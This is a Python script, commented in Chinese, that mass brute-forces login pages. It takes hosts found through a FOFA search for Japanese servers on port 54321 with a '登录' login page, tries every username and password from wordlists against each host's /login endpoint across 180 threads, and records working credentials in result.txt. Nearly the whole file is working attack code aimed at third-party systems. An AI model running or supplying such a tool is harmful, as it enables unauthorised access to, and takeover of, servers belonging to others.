#从https://fofa.info/或者微步导出
#语法：country="JP" && port="54321" && title=="登录"

import csv
import requests
import threading
import logging
import time
from concurrent.futures import ThreadPoolExecutor
import concurrent.futures

#配置日志记录，设置日志级别为INFO
logging.basicConfig(level=logging.INFO)

#从ip_port.csv文件中获取 IP 和端口信息，第一列为ip，第二列为端口
def read_csv_file():
    ip_port_list = []
    try:
        #csv编码方式 encoding='utf-8'    encoding='gbk'
        with open('ip_port.csv', 'r', encoding='utf-8') as csv_file:
            reader = csv.reader(csv_file)
            #跳过第一行字段名
            next(reader)
            #遍历具体ip和端口数据
            for row in reader:  
                if len(row) > 1:
                    ip = row[0].strip()
                    port = row[1].strip()
                    ip_port_list.append((ip, port))  # 以元组形式返回
    except Exception as e:
            logging.error(f"Error processing file {file_name}. Error: {e}")
    return ip_port_list


# 从 username.txt 文件中获取用户名信息
def read_username_file():
    username_list = []
    with open('username.txt', 'r') as f:
        for username in f:
            username = username.strip()
            if username:
                username_list.append(username)
    return username_list

# 从 password.txt 文件中获取密码信息
def read_passwd_file():
    password_list = []
    with open('password.txt', 'r') as f:
        for password in f:
            password = password.strip()
            if password:
                password_list.append(password)
    return password_list

# 尝试连接每个 IP 对应的端口地址，并尝试使用用户名和密码进行登录
def login(domain, port, username, password):
    url = f'http://{domain}:{port}/login'
    data = {'username': username, 'password': password}
    try:
        response = requests.post(url, data=data, timeout=10)  # 设置超时时间为 10 秒
        if response.status_code == 200 and "true" in response.content.decode():
            logging.info(f'Successful login to {url} with username {username} and password {password}')
            with open("result.txt", "a") as f:
                f.write(f"{domain}:{port}——————{data['username']}:{data['password']}\n")
        else:
            logging.info(f'Failed to login to {url} with username {username} and password {password}')
    except requests.exceptions.RequestException as e:
        logging.error(f"Error occurred during login to {url}: {e}")

# 主函数，启动多线程并执行登录操作
def main():
    # 从 CSV 文件中读取域名和端口信息
    domains = read_csv_file()

    # 从文本文件中读取用户名和密码信息
    usernames = read_username_file()
    passwords = read_passwd_file()

    # 控制并发连接数量
    with ThreadPoolExecutor(max_workers=180) as executor:  # 例如，同时最多 180 个并发任务
        futures = []
        for domain, port in domains:
            for username in usernames:
                for password in passwords:
                    future = executor.submit(login, domain, port, username, password)
                    futures.append(future)

        # 等待所有任务完成
        for future in concurrent.futures.as_completed(futures):
            try:
                future.result()
            except Exception as e:
                logging.error(f"Exception occurred in task: {e}")

if __name__ == '__main__':
    main()
